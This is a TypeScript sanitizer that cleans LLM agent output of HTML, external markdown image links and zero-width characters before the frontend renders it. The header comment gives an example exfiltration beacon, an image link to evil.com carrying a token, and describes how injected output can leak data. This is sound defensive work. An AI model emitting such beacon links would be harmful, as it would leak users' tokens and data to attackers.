/**
 * Output sanitizer for LLM-generated agent responses.
 *
 * Applies three classes of sanitization before responses reach the frontend:
 *
 *  1. HTML stripping — removes all HTML tags (the agent should emit markdown,
 *     not HTML; any HTML present is either a hallucination or an injection).
 *     <script>, <style>, <iframe> content is removed entirely (tag + body).
 *     Other tags are stripped but their text content is preserved.
 *
 *  2. Markdown exfiltration link removal — removes ![...](url) image syntax
 *     that references external http/https URLs. Attackers can use these to
 *     exfiltrate data via a beacon request when the frontend renders the
 *     markdown (e.g. ![](https://evil.com/?token=...)).
 *
 *  3. Zero-width character removal — strips invisible Unicode characters
 *     (U+200B, U+200C, U+200D, U+FEFF, U+00AD) that can be used to hide
 *     content, bypass keyword filters, or corrupt rendered text.
 *
 * Valid markdown (bold, italic, tables, lists, headings, code blocks) is
 * preserved unchanged.
 */

/** Tags whose entire content (not just the tag) should be removed. */
const DESTRUCTIVE_TAG_PATTERN = /<(script|style|iframe)[\s\S]*?<\/\1\s*>/gi;

/** All remaining HTML tags — strip the tag but keep inner text. */
const HTML_TAG_PATTERN = /<[^>]+>/g;

/**
 * Markdown image links referencing external http(s) URLs.
 * Format: ![alt text](https://...) or ![](http://...)
 */
const EXTERNAL_IMAGE_LINK_PATTERN = /!\[[^\]]*\]\(https?:\/\/[^)]*\)/gi;

/**
 * Zero-width and invisible Unicode characters:
 *  U+200B  zero width space
 *  U+200C  zero width non-joiner
 *  U+200D  zero width joiner
 *  U+FEFF  zero width no-break space / BOM
 *  U+00AD  soft hyphen
 */
// eslint-disable-next-line no-misleading-character-class
const ZERO_WIDTH_PATTERN = /[\u200B\u200C\u200D\uFEFF\u00AD]/g;

/**
 * Sanitize an LLM response string before returning it to the frontend.
 *
 * Safe for all standard markdown. Does not modify numbers, percentages,
 * currency symbols, or any non-HTML/non-injection content.
 */
export function sanitizeAgentResponse(text: string): string {
  if (!text) {
    return text;
  }

  return (
    text
      // 1. Remove destructive tags + their full body content first
      .replace(DESTRUCTIVE_TAG_PATTERN, '')
      // 2. Strip remaining HTML tags (keep inner text)
      .replace(HTML_TAG_PATTERN, '')
      // 3. Remove external markdown image exfiltration links
      .replace(EXTERNAL_IMAGE_LINK_PATTERN, '')
      // 4. Remove zero-width / invisible characters
      .replace(ZERO_WIDTH_PATTERN, '')
  );
}
